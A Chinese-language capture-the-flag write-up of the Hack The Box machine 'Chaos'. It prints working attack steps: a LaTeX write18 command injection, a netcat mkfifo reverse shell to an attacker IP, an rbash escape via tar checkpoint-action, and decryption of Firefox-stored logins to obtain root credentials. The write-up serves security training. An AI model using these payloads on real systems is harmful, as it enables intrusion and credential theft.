> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-gHwBV6_2_gFicOtWmrjTA)

点击上方 “蓝字” 关注公众号获取最新信息!

> 本文作者：Twe1ve（贝塔安全实验室 - 核心成员）

* * *

nmap 扫描结果：

80/tcp    open     http

|_http-title: Site doesn't have a title (text/html).

110/tcp   open     pop3

143/tcp   open     imap

|_imap-capabilities: LITERAL+ listed more STARTTLS ID LOGIN-REFERRALS IDLE ENABLE post-login capabilities Pre-login IMAP4rev1 OK LOGINDISABLEDA0001 have SASL-IR

|_ssl-date: TLS randomness does not represent time

10000/tcp open     snet-sensor-mgmt

| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on chaos

| Not valid before: 2018-10-28T12:45:28

|_Not valid after:  2023-10-27T12:45:28

|_ssl-date: TLS randomness does not represent time

端口对应服务访问：  

https://10.10.10.120:10000/ ---->webmin 登录 ---> 默认及常规密码无效 ---> 且错误密码过多被拒绝登录

http://10.10.10.120/wp/wordpress/  --->Wordpress 网站

http://10.10.10.120/wp/wordpress/  ---> 密码保护文章

```
wpscan --url http://10.10.10.120/wp/wordpress/ -e ap -e u
得到用户名human
WordPress version 4.9.8
```

使用 human 解开密码保护文章：

```
Creds for webmail :
username – ayush
password – jiujitsu
```

使用 evolution 登录邮箱：得到提示 "You are the password"; 以及两个文件

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qnocBWYC1b9VrxthR6rw6P28fRN10kzYPSQiauvmcrdxIx5V3vyJYBDRNbcria6ia12vtPric5DQpVmgQ/640?wx_fmt=png)

python 脚本内容为 AES 加密，解密：

https://raw.githubusercontent.com/happygirlzt/Cryptography/master/encrypt.py

```
kali@kali:~$ python encrypt.py
Would you like to (E)ncrypt of (D)ecrypt?: 'D'
File to decrypt: 'enim_msg.txt'
Password: 'sahay'
Done.
kali@kali:~$ cat enim_msg.txt_dec
SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK   --- >得到链接：http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3 --->创建PDF
```

test1 无法生成；但是 test2 和 test3 可以

目录扫描发现：

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/doc/latex/adjustbox/  --->latex 可能存在命令注入？？？

```
\immediate\write18{id}
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qnocBWYC1b9VrxthR6rw6P2TS4yXNQp0wiaEicHmaASlafVqTYRRY3JsibE8ZGfCxODyqia9llHibpWmAQ/640?wx_fmt=png)

反弹 shell：### 由于 latex 对 & 等字符解析存在问题；

[方法 1] 需要对 & ; 进行编码

[方法 2] 使用 python 反弹 shell

[方法 3] 构造无 & 符号 nc payload

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 0</tmp/f|nc 10.10.14.67 9999 >/tmp/f
```

使用前边邮箱账户密码成功登录 ayush 用户：---> rbash: cd: restricted

绕过 rbash 限制： 

https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/

https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf

常规方法不能绕过，最终绕过 paylaod

```
tar cf /dev/null rick.tar --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

  

```
ayush@chaos:/home$ echo $PATH
echo $PATH
/home/ayush/.app
###需要修复路径：
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

用户目录下发现. mozilla 文件夹。切换到该目录并开启 SimpleHTTPServer，本机下载改目录下的凭证回来解开

```
wget http://10.10.10.120:8000/ --recursive
```

在 firefox/bzo7sjt1.default / 目录中发现 key4.db 和 logins.json

解密凭证：

https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py 

```
kali@kali:~/10.10.10.120:8000/firefox/bzo7sjt1.default$ python firefox_decrypt.py  /home/kali/10.10.10.120:8000/firefox/bzo7sjt1.default
2020-04-20 06:05:13,798 - WARNING - profile.ini not found in /home/kali/10.10.10.120:8000/firefox/bzo7sjt1.default
2020-04-20 06:05:13,798 - WARNING - Continuing and assuming '/home/kali/10.10.10.120:8000/firefox/bzo7sjt1.default' is a profile location
Master Password for profile /home/kali/10.10.10.120:8000/firefox/bzo7sjt1.default:
Website:   https://chaos.htb:10000
Username: 'root'
Password: 'Thiv8wrej~'
```